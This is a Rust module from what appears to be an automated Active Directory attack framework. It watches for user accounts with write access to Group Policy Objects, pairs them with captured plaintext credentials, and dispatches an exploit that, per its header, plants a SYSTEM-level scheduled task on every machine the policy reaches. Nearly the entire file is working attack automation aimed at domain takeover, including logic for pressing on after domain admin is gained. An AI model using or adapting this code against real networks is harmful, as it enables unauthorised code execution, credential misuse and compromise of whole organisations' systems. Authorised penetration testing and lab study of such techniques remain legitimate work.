//! auto_gpo_abuse -- exploit GPO write access for code execution.
//!
//! When a controlled user has write access to a Group Policy Object
//! (e.g., samwell.tarly has write on a GPO linked to north.sevenkingdoms.local),
//! this automation dispatches `pyGPOAbuse` to inject a scheduled task that
//! runs as SYSTEM on all hosts where the GPO applies.
//!
//! GPO vulns are typically discovered via BloodHound edges (WriteProperty,
//! WriteDacl, GenericAll on GPO objects).

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;

/// Dedup key prefix for GPO abuse attacks.
const DEDUP_GPO_ABUSE: &str = "gpo_abuse";

/// Monitors for GPO write access vulnerabilities and dispatches exploitation.
/// Interval: 30s.
pub async fn auto_gpo_abuse(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("gpo_abuse") {
            continue;
        }

        {
            let state = dispatcher.state.read().await;
            if state.has_domain_admin
                && state.all_forests_dominated()
                && !dispatcher.config.strategy.should_continue_after_da()
            {
                continue;
            }
        }

        let work: Vec<GpoWork> = {
            let state = dispatcher.state.read().await;

            state
                .discovered_vulnerabilities
                .values()
                .filter_map(|vuln| {
                    if !is_gpo_candidate(&vuln.vuln_type) {
                        return None;
                    }

                    if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
                        return None;
                    }

                    let dedup_key = format!("{DEDUP_GPO_ABUSE}:{}", vuln.vuln_id);
                    if state.is_processed(DEDUP_GPO_ABUSE, &dedup_key) {
                        return None;
                    }

                    let source_user = vuln
                        .details
                        .get("source")
                        .or_else(|| vuln.details.get("source_user"))
                        .or_else(|| vuln.details.get("account_name"))
                        .and_then(|v| v.as_str())
                        .map(|s| s.to_string())?;

                    let gpo_id = vuln
                        .details
                        .get("gpo_id")
                        .or_else(|| vuln.details.get("gpo_guid"))
                        .or_else(|| vuln.details.get("object_id"))
                        .and_then(|v| v.as_str())
                        .map(|s| s.to_string());

                    let gpo_name = vuln
                        .details
                        .get("gpo_name")
                        .or_else(|| vuln.details.get("gpo_display_name"))
                        .and_then(|v| v.as_str())
                        .map(|s| s.to_string());

                    let domain = vuln
                        .details
                        .get("domain")
                        .and_then(|v| v.as_str())
                        .unwrap_or("")
                        .to_string();

                    // Find credential for the source user
                    let credential = state
                        .credentials
                        .iter()
                        .find(|c| {
                            c.username.to_lowercase() == source_user.to_lowercase()
                                && (domain.is_empty()
                                    || c.domain.to_lowercase() == domain.to_lowercase())
                        })
                        .cloned();

                    if credential.is_none() {
                        debug!(
                            vuln_id = %vuln.vuln_id,
                            source = %source_user,
                            "GPO abuse skipped: no credential for source user"
                        );
                        return None;
                    }

                    let dc_ip = state
                        .domain_controllers
                        .get(&domain.to_lowercase())
                        .cloned();

                    Some(GpoWork {
                        vuln_id: vuln.vuln_id.clone(),
                        dedup_key,
                        source_user,
                        gpo_id,
                        gpo_name,
                        domain,
                        dc_ip,
                        credential,
                    })
                })
                .collect()
        };

        for item in work {
            let mut payload = json!({
                "technique": "gpo_abuse",
                "vuln_type": "gpo_abuse",
                "vuln_id": item.vuln_id,
                "domain": item.domain,
            });

            if let Some(ref gpo_id) = item.gpo_id {
                payload["gpo_id"] = json!(gpo_id);
            }
            if let Some(ref name) = item.gpo_name {
                payload["gpo_name"] = json!(name);
            }
            if let Some(ref dc) = item.dc_ip {
                payload["target_ip"] = json!(dc);
                payload["dc_ip"] = json!(dc);
            }

            if let Some(ref cred) = item.credential {
                payload["username"] = json!(cred.username);
                payload["password"] = json!(cred.password);
                payload["credential"] = json!({
                    "username": cred.username,
                    "password": cred.password,
                    "domain": cred.domain,
                });
            }

            let priority = dispatcher.effective_priority("gpo_abuse");
            match dispatcher
                .throttled_submit("exploit", "privesc", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        vuln_id = %item.vuln_id,
                        source = %item.source_user,
                        gpo = ?item.gpo_name,
                        "GPO abuse dispatched"
                    );
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_GPO_ABUSE, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_GPO_ABUSE, &item.dedup_key)
                        .await;
                }
                Ok(None) => {}
                Err(e) => {
                    warn!(err = %e, vuln_id = %item.vuln_id, "Failed to dispatch GPO abuse")
                }
            }
        }
    }
}

struct GpoWork {
    vuln_id: String,
    dedup_key: String,
    source_user: String,
    gpo_id: Option<String>,
    gpo_name: Option<String>,
    domain: String,
    dc_ip: Option<String>,
    credential: Option<ares_core::models::Credential>,
}

/// Returns `true` if a vulnerability type represents a GPO abuse candidate.
fn is_gpo_candidate(vuln_type: &str) -> bool {
    let vtype = vuln_type.to_lowercase();
    vtype == "gpo_abuse"
        || vtype == "gpo_write"
        || vtype == "gpo_genericall"
        || vtype == "gpo_genericwrite"
        || vtype == "gpo_writedacl"
        || vtype == "gpo_writeowner"
        || vtype.starts_with("gpo_")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_is_gpo_candidate() {
        assert!(is_gpo_candidate("gpo_abuse"));
        assert!(is_gpo_candidate("GPO_ABUSE"));
        assert!(is_gpo_candidate("gpo_write"));
        assert!(is_gpo_candidate("gpo_genericall"));
        assert!(is_gpo_candidate("gpo_writedacl"));
        assert!(!is_gpo_candidate("genericall"));
        assert!(!is_gpo_candidate("rbcd"));
        assert!(!is_gpo_candidate("esc1"));
    }
}
